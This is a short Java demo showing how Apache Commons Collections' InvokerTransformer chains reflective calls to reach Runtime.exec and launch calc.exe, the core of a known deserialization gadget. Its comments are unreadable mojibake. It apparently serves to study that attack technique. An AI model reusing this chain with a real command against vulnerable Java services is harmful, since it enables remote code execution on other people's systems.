package invokerTransformerDemo;

import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerDemo {
	public static void main(String[] args) throws Exception {
		//Class runtimeClass=Class.forName("java.lang.Runtime");
		//Object runtime=runtimeClass.getMethod("getRuntime").invoke(null);
		//runtimeClass.getMethod("exec", String.class).invoke(runtime,"calc.exe");
		
		Class runtimeClass=Class.forName("java.lang.Runtime");// Runtime�������
		
		//����InvokerTransformer����runtimeClass��getMethod����,������getRuntime,��󷵻ص���ʵ��һ��Method����getRuntime����
		Object m_getMethod=new InvokerTransformer("getMethod",new Class[] {
				String.class,Class[].class},new Object[] {
				"getRuntime",null
				}
		).transform(runtimeClass);
		
		//����InvokerTransformer����m_getMethod��invoke����,û�в���,��󷵻ص���ʵ��runtime�������
		Object runtime=new InvokerTransformer("invoke",new Class[] {
				Object.class,Object[].class},new Object[] {
				null,null
				}
		).transform(m_getMethod);
		
		//����InvokerTransformer����runtime��exec����,����Ϊcalc.exe,���ص���Ȼ��һ��Process����
		Object exec=new InvokerTransformer("exec",new Class[] {
				String.class},new Object[] {
				"calc.exe"
				}
		).transform(runtime);
	}
}